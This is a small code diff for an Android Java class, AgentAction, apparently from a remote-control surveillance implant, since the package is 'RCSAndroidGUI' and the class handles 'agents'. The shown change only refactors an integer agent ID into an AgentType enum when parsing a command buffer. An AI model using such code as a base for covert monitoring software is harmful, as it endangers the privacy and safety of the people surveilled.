@@ -13,6 +13,7 @@ import java.io.IOException;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.agent.AgentManager;
+import com.ht.RCSAndroidGUI.agent.AgentType;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 // TODO: Auto-generated Javadoc
@@ -22,7 +23,7 @@ import com.ht.RCSAndroidGUI.util.DataBuffer;
 public abstract class AgentAction extends SubAction {
 	private static final String TAG = "AgentAction";
 	
-	protected int agentId;
+	protected AgentType agentId;
 	
 	/**
 	 * Instantiates a new stop agent action.
@@ -40,7 +41,8 @@ public abstract class AgentAction extends SubAction {
 	protected boolean parse(byte[] params) {
 		final DataBuffer databuffer = new DataBuffer(params, 0, params.length);
 		try {
-			agentId = databuffer.readInt();
+			int type = databuffer.readInt();
+			agentId = AgentType.get(type);
 
 		} catch (final IOException e) {
 			Log.d("QZ", TAG + " (parse) Error: " + e.toString());
